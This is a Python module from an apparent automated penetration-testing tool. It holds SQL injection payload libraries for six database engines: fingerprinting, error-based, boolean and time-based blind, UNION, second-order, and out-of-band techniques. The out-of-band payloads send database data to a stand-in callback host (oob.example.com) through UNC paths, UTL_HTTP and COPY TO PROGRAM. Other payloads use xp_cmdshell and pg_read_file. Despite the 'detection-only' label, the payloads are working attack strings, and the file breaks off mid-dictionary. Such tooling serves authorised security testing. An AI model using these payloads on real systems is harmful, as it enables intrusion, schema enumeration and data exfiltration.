#!/usr/bin/env python3
"""Advanced SQL Injection Engine — DB fingerprinting, error/boolean/time/union/OOB/second-order/WAF bypass (v3.0.0).

Provides comprehensive SQL injection detection payloads and strategies across
six major database engines. This module is deterministic and side-effect free
w.r.t. the network: it takes a target context and returns a structured injection
plan that the agent executes.

Capabilities:
  1. Database Fingerprinting — DB-specific payloads for MySQL, PostgreSQL, MSSQL,
     Oracle, SQLite, MariaDB. Version extraction, comment syntax, string
     concatenation, error signature patterns.
  2. Error-Based Extraction — extractvalue/updatexml (MySQL), convert+char (MSSQL),
     CTXSYS.DRITHSX.SN (Oracle), CAST (PostgreSQL).
  3. Boolean-Based Blind — AND 1=1 vs AND 1=2 differential with substr/ascii char
     extraction plan.
  4. Time-Based Blind — DB-specific sleep/delay with inference logic and timing
     thresholds.
  5. UNION-Based — ORDER BY column discovery, type compatibility, data concatenation.
  6. Out-of-Band (OOB) — DNS/HTTP exfiltration: LOAD_FILE+UNC (MySQL/Win),
     xp_dirtree/xp_fileexist (MSSQL), UTL_HTTP (Oracle), COPY+pg_read_file (PG).
  7. Second-Order SQLi — Detection patterns for stored SQLi triggered on later loads.
  8. WAF Bypass Payloads — Inline comments, URL encoding, double encoding, case
     variation, whitespace alternatives, scientific notation, HPP.

SAFETY: All payloads are DETECTION-ONLY. No DROP/TRUNCATE/DELETE. No actual data
exfiltration — only proof that data could be extracted.

Usage (CLI):
  python advanced_sqli.py --url "http://target.com/page.php?id=1" --param id --method GET
  python advanced_sqli.py --url "http://target.com/page.php?id=1" --param id --db-type mysql
  python advanced_sqli.py --generate-payloads --vuln-type boolean_blind --db-type mysql
  python advanced_sqli.py --batch targets.json
"""

from __future__ import annotations

import argparse
import json
import os
import sys
from dataclasses import dataclass, field

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from utils import load_json, dump_json


# =============================================================================
# Database Fingerprinting — DB-specific identifiers
# =============================================================================
DB_FINGERPRINT = {
    "mysql": {
        "version_payloads": [
            {"payload": "SELECT VERSION()", "signal": "MySQL version string (e.g. 8.0.35)"},
            {"payload": "SELECT @@version", "signal": "MySQL @@version variable"},
            {"payload": "SELECT @@version_comment", "signal": "MySQL distribution info"},
            {"payload": "/*!50000SELECT*/ VERSION()", "signal": "MySQL versioned comment execution"},
        ],
        "comment_syntax": [
            {"style": "inline", "syntax": "-- ", "notes": "requires trailing space"},
            {"style": "inline_hash", "syntax": "#", "notes": "no trailing space needed"},
            {"style": "block", "syntax": "/* comment */", "notes": "universal"},
            {"style": "versioned", "syntax": "/*!50700 SELECT ... */", "notes": "executes if MySQL >= 5.7.00"},
        ],
        "string_concat": [
            {"method": "CONCAT(a,b,c)", "example": "CONCAT(0x50,0x54,0x53)"},
            {"method": "CONCAT_WS(',',a,b)", "example": "CONCAT_WS(0x2c,user,password)"},
        ],
        "error_signatures": [
            "SQL syntax.*MySQL", "MySQL server version", "check the manual that corresponds to your MySQL",
            "You have an error in your SQL syntax", "mysql_fetch", "mysqli_fetch",
            "Warning.*mysql_.*", "MySQLSyntaxErrorException",
        ],
        "default_port": 3306,
    },
    "postgresql": {
        "version_payloads": [
            {"payload": "SELECT VERSION()", "signal": "PostgreSQL version string"},
            {"payload": "SELECT current_setting('server_version')", "signal": "PG server_version setting"},
            {"payload": "SELECT version()", "signal": "full PG version with OS info"},
        ],
        "comment_syntax": [
            {"style": "inline", "syntax": "-- ", "notes": "requires trailing space"},
            {"style": "block", "syntax": "/* comment */", "notes": "universal"},
        ],
        "string_concat": [
            {"method": "a || b", "example": "CHR(80)||CHR(84)||CHR(83)"},
            {"method": "CONCAT(a,b)", "example": "CONCAT('PT','SKILLTEST')"},
        ],
        "error_signatures": [
            "PG::SyntaxError", "psql:", "PostgreSQL.*ERROR", "ERROR:.*syntax error",
            "WARNING.*PostgreSQL", "pg_query\\(\\)", "pg_exec\\(\\)",
        ],
        "default_port": 5432,
    },
    "mssql": {
        "version_payloads": [
            {"payload": "SELECT @@VERSION", "signal": "MSSQL full version string"},
            {"payload": "SELECT SERVERPROPERTY('productversion')", "signal": "MSSQL product version"},
            {"payload": "SELECT SERVERPROPERTY('edition')", "signal": "MSSQL edition (Express/Standard/Enterprise)"},
        ],
        "comment_syntax": [
            {"style": "inline", "syntax": "-- ", "notes": "requires trailing space"},
            {"style": "block", "syntax": "/* comment */", "notes": "universal"},
        ],
        "string_concat": [
            {"method": "a + b", "example": "CHAR(80)+CHAR(84)+CHAR(83)"},
            {"method": "CONCAT(a,b)", "example": "CONCAT('PT','SKILLTEST')  (MSSQL 2012+)"},
        ],
        "error_signatures": [
            "Microsoft OLE DB Provider", "Microsoft SQL Server", "ODBC SQL Server Driver",
            "SQL Server.*Driver", "Procedure.*expects parameter", "Unclosed quotation mark",
            "Incorrect syntax near", "mssql_query\\(\\)", "sqlsrv_",
        ],
        "default_port": 1433,
    },
    "oracle": {
        "version_payloads": [
            {"payload": "SELECT banner FROM v$version WHERE ROWNUM=1", "signal": "Oracle banner string"},
            {"payload": "SELECT banner FROM v$version", "signal": "all Oracle version banners"},
            {"payload": "SELECT * FROM v$instance", "signal": "Oracle instance info"},
        ],
        "comment_syntax": [
            {"style": "inline", "syntax": "-- ", "notes": "requires trailing space"},
            {"style": "block", "syntax": "/* comment */", "notes": "universal"},
        ],
        "string_concat": [
            {"method": "a || b", "example": "CHR(80)||CHR(84)||CHR(83)"},
            {"method": "CONCAT(a,b)", "example": "CONCAT('PT','SKILLTEST')"},
        ],
        "error_signatures": [
            "ORA-\\d{5}", "Oracle.*Driver", "java.sql.SQLException",
            "Oracle Database", "PLS-", "ORA-01756", "ORA-01789",
        ],
        "default_port": 1521,
    },
    "sqlite": {
        "version_payloads": [
            {"payload": "SELECT sqlite_version()", "signal": "SQLite version string"},
            {"payload": "SELECT sqlite_source_id()", "signal": "SQLite source commit hash"},
        ],
        "comment_syntax": [
            {"style": "inline", "syntax": "-- ", "notes": "requires trailing space"},
            {"style": "block", "syntax": "/* comment */", "notes": "universal"},
        ],
        "string_concat": [
            {"method": "a || b", "example": "CHAR(80)||CHAR(84)||CHAR(83)"},
            {"method": "GROUP_CONCAT(x,'')", "example": "SELECT GROUP_CONCAT(name,'') FROM sqlite_master"},
        ],
        "error_signatures": [
            "sqlite3.OperationalError", "SQLite.*JDBC", "SQLiteException",
            "near \".*\": syntax error", "SQL logic error", "no such table",
        ],
        "default_port": None,
    },
    "mariadb": {
        "version_payloads": [
            {"payload": "SELECT VERSION()", "signal": "MariaDB version (includes 'MariaDB' string)"},
            {"payload": "SELECT @@version", "signal": "MariaDB @@version variable"},
        ],
        "comment_syntax": [
            {"style": "inline", "syntax": "-- ", "notes": "requires trailing space"},
            {"style": "inline_hash", "syntax": "#", "notes": "no trailing space needed"},
            {"style": "block", "syntax": "/* comment */", "notes": "universal"},
            {"style": "versioned", "syntax": "/*!50700 SELECT ... */", "notes": "executes if MariaDB >= 5.7.00"},
        ],
        "string_concat": [
            {"method": "CONCAT(a,b,c)", "example": "CONCAT(0x50,0x54,0x53)"},
            {"method": "a || b  (sql_mode=PIPES_AS_CONCAT)", "example": "CHR(80)||CHR(84)||CHR(83)"},
        ],
        "error_signatures": [
            "MariaDB", "check the manual that corresponds to your MariaDB",
            "You have an error in your SQL syntax", "mysql_fetch",
        ],
        "default_port": 3306,
    },
}

# =============================================================================
# Error-Based Extraction Payloads
# =============================================================================
ERROR_BASED_PAYLOADS = {
    "mysql": [
        {
            "name": "extractvalue_xpath",
            "payload": " AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT VERSION()),0x7e))-- ",
            "signal": "XPATH error containing version string",
            "description": "extractvalue() triggers XPATH parse error leaking data",
        },
        {
            "name": "updatexml_xpath",
            "payload": " AND UPDATEXML(1,CONCAT(0x7e,(SELECT VERSION()),0x7e),1)-- ",
            "signal": "XPATH error containing version string",
            "description": "updatexml() triggers XPATH parse error leaking data",
        },
        {
            "name": "extractvalue_subquery",
            "payload": " AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))-- ",
            "signal": "XPATH error enumerating tables",
            "description": "extractvalue() leaks table names via XPATH error (detection only)",
        },
        {
            "name": "name_const",
            "payload": " AND (SELECT * FROM (SELECT NAME_CONST(VERSION(),1),NAME_CONST(VERSION(),1)) AS x)-- ",
            "signal": "Duplicate column error with version",
            "description": "NAME_CONST duplicate column reveals version in error",
        },
        {
            "name": "double_query",
            "payload": " AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
            "signal": "Duplicate entry error with version",
            "description": "Double-query (group by floor rand) technique leaks version",
        },
    ],
    "postgresql": [
        {
            "name": "cast_type_error",
            "payload": " AND 1=CAST(VERSION() AS INT)-- ",
            "signal": "Type error containing version string",
            "description": "CAST to incompatible type reveals version in error",
        },
        {
            "name": "cast_version",
            "payload": " AND 1=CAST((SELECT current_setting('server_version')) AS INTEGER)-- ",
            "signal": "integer conversion error with server version",
            "description": "CAST subquery result to integer triggers type error",
        },
        {
            "name": "cast_table_name",
            "payload": " AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0) AS INTEGER)-- ",
            "signal": "Type error with first table name",
            "description": "CAST table name to integer reveals schema info",
        },
    ],
    "mssql": [
        {
            "name": "convert_int",
            "payload": " AND 1=CONVERT(INT,(SELECT @@VERSION))-- ",
            "signal": "Conversion error with MSSQL version",
            "description": "CONVERT to INT triggers error leaking version",
        },
        {
            "name": "convert_char",
            "payload": " AND 1=CONVERT(INT,(SELECT TOP 1 TABLE_NAME FROM information_schema.tables))-- ",
            "signal": "Conversion error with table name",
            "description": "CONVERT top table name to INT reveals schema",
        },
        {
            "name": "convert_column",
            "payload": " AND 1=CONVERT(INT,(SELECT TOP 1 COLUMN_NAME FROM information_schema.columns))-- ",
            "signal": "Conversion error with column name",
            "description": "CONVERT column name to INT reveals schema",
        },
    ],
    "oracle": [
        {
            "name": "ctxsys_drithsx_sn",
            "payload": " AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- ",
            "signal": "ORA error containing version banner",
            "description": "CTXSYS.DRITHSX.SN triggers error leaking version",
        },
        {
            "name": "ctxsys_drithsx_sn_tables",
            "payload": " AND 1=CTXSYS.DRITHSX.SN(1,(SELECT table_name FROM all_tables WHERE ROWNUM=1))-- ",
            "signal": "ORA error with first table name",
            "description": "CTXSYS.DRITHSX.SN leaks table name via error",
        },
        {
            "name": "utl_inaddr_get_host_name",
            "payload": " AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))-- ",
            "signal": "ORA error containing version info",
            "description": "UTL_INADDR.GET_HOST_NAME with version string triggers error",
        },
    ],
    "sqlite": [
        {
            "name": "abs_error",
            "payload": " AND ABS(-9223372036854775808)-- ",
            "signal": "integer overflow error (SQLite 3 only)",
            "description": "ABS of most negative int64 triggers overflow",
        },
        {
            "name": "likelihood_error",
            "payload": " AND LIKELIHOOD(sqlite_version(),0.5)-- ",
            "signal": "Function error if LIKELIHOOD not available",
            "description": "LIKELIHOOD() triggers error in some SQLite builds",
        },
    ],
}

# =============================================================================
# Boolean-Based Blind Payloads
# =============================================================================
BOOLEAN_BLIND_PAYLOADS = {
    "baseline": {"payload": "", "description": "Original request without injection", "expected": "baseline"},
    "true_condition": {
        "generic": [
            {"payload": " AND 1=1-- ", "type": "integer_and_true"},
            {"payload": " AND 'a'='a'-- ", "type": "string_and_true"},
            {"payload": "' AND '1'='1'-- ", "type": "string_quote_true"},
            {"payload": "' AND '1'='1", "type": "string_quote_true_no_comment"},
        ],
        "mysql": [
            {"payload": " AND 1=1#", "type": "hash_comment_true"},
            {"payload": " AND 1=1/*PTSKILLTEST*/", "type": "block_comment_true"},
        ],
        "postgresql": [
            {"payload": " AND 1=1-- ", "type": "pg_true"},
        ],
        "mssql": [
            {"payload": " AND 1=1-- ", "type": "mssql_true"},
        ],
        "oracle": [
            {"payload": " AND 1=1-- ", "type": "oracle_true"},
            {"payload": " AND 1=1 FROM DUAL-- ", "type": "oracle_dual_true"},
        ],
        "sqlite": [
            {"payload": " AND 1=1-- ", "type": "sqlite_true"},
        ],
    },
    "false_condition": {
        "generic": [
            {"payload": " AND 1=2-- ", "type": "integer_and_false"},
            {"payload": " AND 'a'='b'-- ", "type": "string_and_false"},
            {"payload": "' AND '1'='2'-- ", "type": "string_quote_false"},
        ],
        "mysql": [
            {"payload": " AND 1=2#", "type": "hash_comment_false"},
        ],
        "postgresql": [
            {"payload": " AND 1=2-- ", "type": "pg_false"},
        ],
        "mssql": [
            {"payload": " AND 1=2-- ", "type": "mssql_false"},
        ],
        "oracle": [
            {"payload": " AND 1=2-- ", "type": "oracle_false"},
        ],
        "sqlite": [
            {"payload": " AND 1=2-- ", "type": "sqlite_false"},
        ],
    },
}

# Substr/ascii character extraction plan (used after boolean blind confirmed)
BOOLEAN_EXTRACTION_PLAN = {
    "technique": "substr_ascii_binary_search",
    "description": "Character-by-character extraction using substr()+ascii() with binary search over ASCII range 32-126, comparing TRUE vs FALSE response lengths.",
    "detection_only_note": "Extract ONLY the first 3 characters of VERSION() as proof of extractability. DO NOT enumerate table data.",
    "mysql_template": (
        " AND ASCII(SUBSTR((SELECT VERSION()),{pos},1)){op}{val}-- "
    ),
    "postgresql_template": (
        " AND ASCII(SUBSTR((SELECT VERSION()),{pos},1)){op}{val}-- "
    ),
    "mssql_template": (
        " AND ASCII(SUBSTRING((SELECT @@VERSION),{pos},1)){op}{val}-- "
    ),
    "oracle_template": (
        " AND ASCII(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),{pos},1)){op}{val}-- "
    ),
    "sqlite_template": (
        " AND UNICODE(SUBSTR((SELECT sqlite_version()),{pos},1)){op}{val}-- "
    ),
    "operators": [">", "<", "="],
    "ascii_range": [32, 126],
    "max_chars": 3,
}

# =============================================================================
# Time-Based Blind Payloads
# =============================================================================
TIME_BASED_PAYLOADS = {
    "mysql": [
        {
            "name": "sleep_basic",
            "payload": " AND SLEEP(2)-- ",
            "threshold_seconds": 1.8,
            "max_seconds": 3.0,
            "description": "SLEEP(n) pauses for n seconds (MySQL 5.0.12+)",
        },
        {
            "name": "sleep_conditional",
            "payload": " AND IF(1=1,SLEEP(2),0)-- ",
            "threshold_seconds": 1.8,
            "max_seconds": 3.0,
            "description": "IF-conditioned SLEEP for conditional time-based",
        },
        {
            "name": "benchmark",
            "payload": " AND BENCHMARK(5000000,MD5(1))-- ",
            "threshold_seconds": 1.0,
            "max_seconds": 5.0,
            "description": "BENCHMARK(count,expr) creates CPU-bound delay",
        },
        {
            "name": "benchmark_conditional",
            "payload": " AND IF(1=1,BENCHMARK(5000000,MD5('x')),0)-- ",
            "threshold_seconds": 1.0,
            "max_seconds": 5.0,
            "description": "IF-conditioned BENCHMARK",
        },
        {
            "name": "heavy_query",
            "payload": " AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)-- ",
            "threshold_seconds": 0.8,
            "max_seconds": 5.0,
            "description": "Cross-product COUNT creates CPU delay",
        },
    ],
    "postgresql": [
        {
            "name": "pg_sleep",
            "payload": "; SELECT PG_SLEEP(2)-- ",
            "threshold_seconds": 1.8,
            "max_seconds": 3.0,
            "description": "pg_sleep(n) pauses for n seconds",
        },
        {
            "name": "pg_sleep_conditional",
            "payload": "; SELECT CASE WHEN (1=1) THEN PG_SLEEP(2) ELSE PG_SLEEP(0) END-- ",
            "threshold_seconds": 1.8,
            "max_seconds": 3.0,
            "description": "CASE-conditioned pg_sleep",
        },
        {
            "name": "generate_series_delay",
            "payload": " AND (SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000))-- ",
            "threshold_seconds": 0.8,
            "max_seconds": 5.0,
            "description": "GENERATE_SERIES large count creates CPU delay",
        },
    ],
    "mssql": [
        {
            "name": "waitfor_delay",
            "payload": "; WAITFOR DELAY '00:00:02'-- ",
            "threshold_seconds": 1.8,
            "max_seconds": 3.0,
            "description": "WAITFOR DELAY pauses for specified time",
        },
        {
            "name": "waitfor_delay_conditional",
            "payload": "; IF (1=1) WAITFOR DELAY '00:00:02'-- ",
            "threshold_seconds": 1.8,
            "max_seconds": 3.0,
            "description": "IF-conditioned WAITFOR DELAY",
        },
        {
            "name": "waitfor_time",
            "payload": "; WAITFOR TIME '23:59:59'-- ",
            "threshold_seconds": 5.0,
            "max_seconds": 10.0,
            "description": "WAITFOR TIME waits until specific time (heavy, use sparingly)",
        },
        {
            "name": "xp_cmdshell_ping",
            "payload": "; EXEC xp_cmdshell 'ping -n 3 127.0.0.1'-- ",
            "threshold_seconds": 1.5,
            "max_seconds": 5.0,
            "description": "xp_cmdshell ping creates delay (requires xp_cmdshell enabled)",
        },
    ],
    "oracle": [
        {
            "name": "dbms_lock_sleep",
            "payload": " AND DBMS_LOCK.SLEEP(2)=1-- ",
            "threshold_seconds": 1.8,
            "max_seconds": 3.0,
            "description": "DBMS_LOCK.SLEEP pauses for n seconds",
        },
        {
            "name": "dbms_lock_sleep_conditional",
            "payload": " AND (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(2) ELSE 1 END FROM DUAL)=1-- ",
            "threshold_seconds": 1.8,
            "max_seconds": 3.0,
            "description": "CASE-conditioned DBMS_LOCK.SLEEP",
        },
        {
            "name": "dbms_pipe_receive_message",
            "payload": " AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),2)=1-- ",
            "threshold_seconds": 1.8,
            "max_seconds": 3.0,
            "description": "DBMS_PIPE.RECEIVE_MESSAGE with timeout",
        },
        {
            "name": "utl_http_delay",
            "payload": " AND UTL_HTTP.REQUEST('http://127.0.0.1:1') IS NULL-- ",
            "threshold_seconds": 1.0,
            "max_seconds": 10.0,
            "description": "UTL_HTTP connection timeout (network-dependent delay)",
        },
    ],
    "sqlite": [
        {
            "name": "randomblob",
            "payload": " AND RANDOMBLOB(100000000) IS NOT NULL-- ",
            "threshold_seconds": 0.8,
            "max_seconds": 5.0,
            "description": "RANDOMBLOB large allocation creates CPU delay",
        },
        {
            "name": "zeroblob",
            "payload": " AND ZEROBLOB(100000000) IS NOT NULL-- ",
            "threshold_seconds": 0.8,
            "max_seconds": 5.0,
            "description": "ZEROBLOB large allocation creates CPU delay",
        },
        {
            "name": "like_blob_delay",
            "payload": " AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000)))))-- ",
            "threshold_seconds": 0.8,
            "max_seconds": 5.0,
            "description": "LIKE with large RANDOMBLOB creates delay",
        },
    ],
}

# Time-based inference logic
TIME_INFERENCE = {
    "baseline_measurement": "Record baseline response time for the target endpoint (3 samples, take median).",
    "threshold_calculation": "threshold = max(baseline * 3, 1.5s). Any response exceeding threshold is a candidate.",
    "capped_max": "Never allow single-payload delay > 5s. If payload would exceed this, reduce the sleep parameter.",
    "one_per_param": "Only ONE time-based probe per parameter per run to limit load.",
    "false_positive_guard": "Require at least 2 out of 3 retries to exceed threshold before flagging.",
    "skip_if_unstable": "If baseline stddev > 1.0s, skip time-based testing (network too unstable).",
}

# =============================================================================
# UNION-Based Injection Payloads
# =============================================================================
UNION_PAYLOADS = {
    "column_discovery": {
        "technique": "order_by",
        "description": "Use ORDER BY n to discover column count. Increment n from 1 until error or response change.",
        "payloads": [
            {"payload": "' ORDER BY {n}-- ", "description": "Increment n from 1 to 50"},
            {"payload": "' ORDER BY {n}#", "description": "MySQL hash variant"},
            {"payload": "') ORDER BY {n}-- ", "description": "Parenthesized variant"},
            {"payload": '" ORDER BY {n}-- ', "description": "Double-quote variant"},
        ],
    },
    "null_union": {
        "technique": "union_select_null",
        "description": "UNION SELECT with increasing NULL columns until no error.",
        "template": "' UNION SELECT {nulls}-- ",
        "null_placeholder": "NULL",
        "variants": [
            {"payload": "' UNION SELECT {nulls}-- ", "type": "single_quote"},
            {"payload": '" UNION SELECT {nulls}-- ', "type": "double_quote"},
            {"payload": "') UNION SELECT {nulls}-- ", "type": "parenthesized"},
            {"payload": " UNION SELECT {nulls}-- ", "type": "integer_no_quote"},
        ],
    },
    "type_compatibility": {
        "description": "Replace NULLs with typed literals to find column data types.",
        "type_probes": [
            {"type": "string", "value": "'PTSKILLTEST'", "signal": "'PTSKILLTEST' reflected in response"},
            {"type": "integer", "value": "1", "signal": "integer column in response"},
            {"type": "float", "value": "1.5", "signal": "float column in response"},
            {"type": "date", "value": "CURRENT_DATE", "signal": "date column (DB-specific function)"},
        ],
    },
    "data_concat": {
        "description": "Concatenate multiple columns into one output string for data retrieval.",
        "mysql": "CONCAT({cols})",
        "postgresql": "{col1}||':'||{col2}",
        "mssql": "{col1}+':'+{col2}",
        "oracle": "{col1}||':'||{col2}",
        "sqlite": "{col1}||':'||{col2}",
    },
}

# Pre-built UNION SELECT payloads per DB
UNION_SELECT_PAYLOADS = {
    "mysql": [
        {
            "name": "version_union",
            "payload": "' UNION SELECT NULL,CONCAT(VERSION(),':',DATABASE()),NULL-- ",
            "column_count": 3,
            "signal": "Version and database name concatenated in response",
        },
        {
            "name": "version_union_2col",
            "payload": "' UNION SELECT VERSION(),DATABASE()-- ",
            "column_count": 2,
            "signal": "Version and database in separate columns",
        },
        {
            "name": "tables_union",
            "payload": "' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- ",
            "column_count": 3,
            "signal": "Table names in response (detection only — proves extractability)",
        },
    ],
    "postgresql": [
        {
            "name": "version_union",
            "payload": "' UNION SELECT NULL,VERSION(),NULL-- ",
            "column_count": 3,
            "signal": "Version string in response",
        },
        {
            "name": "current_db",
            "payload": "' UNION SELECT CURRENT_DATABASE(),CURRENT_USER-- ",
            "column_count": 2,
            "signal": "Database and user in response",
        },
        {
            "name": "tables_union",
            "payload": "' UNION SELECT NULL,STRING_AGG(table_name,','),NULL FROM information_schema.tables WHERE table_schema=current_database()-- ",
            "column_count": 3,
            "signal": "Table names via STRING_AGG",
        },
    ],
    "mssql": [
        {
            "name": "version_union",
            "payload": "' UNION SELECT NULL,@@VERSION,NULL-- ",
            "column_count": 3,
            "signal": "MSSQL version in response",
        },
        {
            "name": "db_name",
            "payload": "' UNION SELECT DB_NAME(),SYSTEM_USER-- ",
            "column_count": 2,
            "signal": "Database name and system user",
        },
        {
            "name": "tables_union",
            "payload": "' UNION SELECT NULL,STRING_AGG(TABLE_NAME,','),NULL FROM information_schema.tables-- ",
            "column_count": 3,
            "signal": "Table names via STRING_AGG (MSSQL 2017+)",
        },
    ],
    "oracle": [
        {
            "name": "version_union",
            "payload": "' UNION SELECT NULL,banner,NULL FROM v$version WHERE ROWNUM=1-- ",
            "column_count": 3,
            "signal": "Oracle banner in response",
        },
        {
            "name": "username",
            "payload": "' UNION SELECT USER,SYS_CONTEXT('USERENV','CURRENT_SCHEMA') FROM DUAL-- ",
            "column_count": 2,
            "signal": "User and schema in response",
        },
        {
            "name": "tables_union",
            "payload": "' UNION SELECT NULL,LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name),NULL FROM all_tables WHERE ROWNUM<=5-- ",
            "column_count": 3,
            "signal": "First 5 table names via LISTAGG",
        },
    ],
    "sqlite": [
        {
            "name": "version_union",
            "payload": "' UNION SELECT sqlite_version(),NULL-- ",
            "column_count": 2,
            "signal": "SQLite version in response",
        },
        {
            "name": "tables_union",
            "payload": "' UNION SELECT GROUP_CONCAT(name),NULL FROM sqlite_master WHERE type='table'-- ",
            "column_count": 2,
            "signal": "All table names from sqlite_master",
        },
    ],
}

# =============================================================================
# Out-of-Band (OOB) Exfiltration Payloads
# =============================================================================
OOB_PAYLOADS = {
    "mysql_windows_unc": [
        {
            "name": "load_file_unc",
            "payload": " AND LOAD_FILE(CONCAT('\\\\\\\\',DATABASE(),'.PTSKILLTEST.oob.example.com\\\\a'))-- ",
            "requires": "MySQL on Windows, secure_file_priv not restrictive, DNS outbound allowed",
            "signal": "DNS query for <database>.PTSKILLTEST.oob.example.com received at callback sink",
            "description": "LOAD_FILE with UNC path forces Windows DNS lookup containing database name",
        },
        {
            "name": "load_file_unc_version",
            "payload": " AND LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.PTSKILLTEST.oob.example.com\\\\a'))-- ",
            "requires": "MySQL on Windows, secure_file_priv not restrictive",
            "signal": "DNS query with version string subdomain",
            "description": "DNS exfiltration of version via UNC path",
        },
    ],
    "mssql": [
        {
            "name": "xp_dirtree",
            "payload": "; EXEC master..xp_dirtree '\\\\PTSKILLTEST.oob.example.com\\a'-- ",
            "requires": "xp_dirtree enabled, DNS outbound allowed",
            "signal": "DNS lookup for PTSKILLTEST.oob.example.com",
            "description": "xp_dirtree forces SMB connection attempt with DNS lookup",
        },
        {
            "name": "xp_fileexist",
            "payload": "; EXEC master..xp_fileexist '\\\\PTSKILLTEST.oob.example.com\\a'-- ",
            "requires": "xp_fileexist enabled, DNS outbound allowed",
            "signal": "DNS lookup for PTSKILLTEST.oob.example.com",
            "description": "xp_fileexist forces SMB connection attempt with DNS lookup",
        },
        {
            "name": "xp_subdirs",
            "payload": "; EXEC master..xp_subdirs '\\\\PTSKILLTEST.oob.example.com\\a'-- ",
            "requires": "xp_subdirs enabled, DNS outbound allowed",
            "signal": "DNS lookup for PTSKILLTEST.oob.example.com",
            "description": "xp_subdirs forces SMB connection attempt with DNS lookup",
        },
    ],
    "oracle": [
        {
            "name": "utl_http_oob",
            "payload": " AND UTL_HTTP.REQUEST('http://PTSKILLTEST.oob.example.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1)) IS NULL-- ",
            "requires": "UTL_HTTP granted, HTTP outbound allowed",
            "signal": "HTTP request to callback sink with version in path",
            "description": "UTL_HTTP.REQUEST sends HTTP request to OOB server with version data",
        },
        {
            "name": "utl_inaddr_oob",
            "payload": " AND UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1)||'.PTSKILLTEST.oob.example.com') IS NULL-- ",
            "requires": "UTL_INADDR granted, DNS outbound allowed",
            "signal": "DNS lookup with version string as subdomain",
            "description": "UTL_INADDR.GET_HOST_ADDRESS triggers DNS lookup for exfiltration",
        },
        {
            "name": "httpuritype_oob",
            "payload": " AND HTTPURITYPE('http://PTSKILLTEST.oob.example.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1)).GETCLOB() IS NULL-- ",
            "requires": "HTTPURITYPE granted, HTTP outbound allowed",
            "signal": "HTTP request to callback sink",
            "description": "HTTPURITYPE sends HTTP request for OOB exfiltration",
        },
    ],
    "postgresql": [
        {
            "name": "copy_program_oob",
            "payload": "; COPY (SELECT VERSION()) TO PROGRAM 'nslookup PTSKILLTEST.oob.example.com'-- ",
            "requires": "Superuser or pg_execute_server_program granted, COPY TO PROGRAM allowed",
            "signal": "DNS lookup for PTSKILLTEST.oob.example.com",
            "description": "COPY TO PROGRAM executes shell command for DNS exfiltration",
        },
        {
            "name": "dblink_oob",
            "payload": " AND dblink_connect('host=PTSKILLTEST.oob.example.com user=u password=p dbname=d')-- ",
            "requires": "dblink extension installed",
            "signal": "DNS lookup for PTSKILLTEST.oob.example.com (connection fails but DNS resolves)",
            "description": "dblink_connect triggers DNS lookup for host parameter",
        },
        {
            "name": "pg_read_file_oob",
            "payload": " AND pg_read_file('/etc/hostname') IS NOT NULL-- ",
            "requires": "Superuser or pg_read_server_files role",
            "signal": "Hostname content in error message",
            "description": "pg_read_file reads server file (detection if readable)",
        },
    ],
    "sqlite": [
        {
            "name": "attach_database_oob",
            "payload": "'; ATTACH DATABASE '\\\\PTSKILLTEST.oob.example.com\\a' AS oob-- ",
            "requires": "SQLite on Windows, stacked queries allowed, UNC path support",
            "signal": "DNS lookup for PTSKILLTEST.oob.example.com",
            "description": "ATTACH DATABASE with UNC path forces DNS lookup (Windows only)",
        },
    ],
}

# =============================================================================
# Second-Order SQL Injection Detection
# =============================================================================
SECOND_ORDER_PAYLOADS = {
    "description": (
        "Second-order SQLi occurs when a malicious value is stored in the database "
        "and later used in an unsafe SQL query without proper escaping. Detection "
        "requires two stages: (1) inject the payload into a stored field, "
        "(2) trigger the vulnerable page that reads the stored value."
    ),
    "injection_markers": [
        {
            "name": "quote_trigger",
            "payload": "PTSKILLTEST'sqli2nd",
            "description": "Single quote in stored field; if vulnerable, reading page throws SQL error",
            "signal": "SQL error on the page that reads the stored value",
        },
        {
            "name": "double_quote_trigger",
            "payload": 'PTSKILLTEST"sqli2nd',
            "description": "Double quote in stored field",
            "signal": "SQL error on the read page",
        },
        {
            "name": "backslash_trigger",
            "payload": "PTSKILLTEST\\sqli2nd",
            "description": "Backslash escape test; on some DBs corrupts the closing quote",
            "signal": "SQL error or response change on read page",
        },
        {
            "name": "boolean_payload",
            "payload": "PTSKILLTEST' OR '1'='1",
            "description": "Boolean payload stored then triggered on read",
            "signal": "Response change on read page (more/less data than baseline)",
        },
        {
            "name": "sleep_payload_mysql",
            "payload": "PTSKILLTEST' AND SLEEP(2) AND '1'='1",
            "description": "Time-based payload stored for MySQL target",
            "signal": "Response delay >= 2s on the read page",
        },
        {
            "name": "sleep_payload_pg",
            "payload": "PTSKILLTEST' AND (SELECT PG_SLEEP(2)) AND '1'='1",
            "description": "Time-based payload stored for PostgreSQL target",
            "signal": "Response delay >= 2s on the read page",
        },
    ],
    "detection_workflow": [
        "1. Identify all input fields that store data (registration, profile edit, comments, etc.)",
        "2. Submit the injection marker through each input field",
        "3. Enumerate all pages that display stored data for that user/entity",
        "4. After submission, fetch each read page and check for SQL error signatures or response changes",
        "5. If a signal is detected, mark the injection point and the trigger page as a second-order finding",
    ],
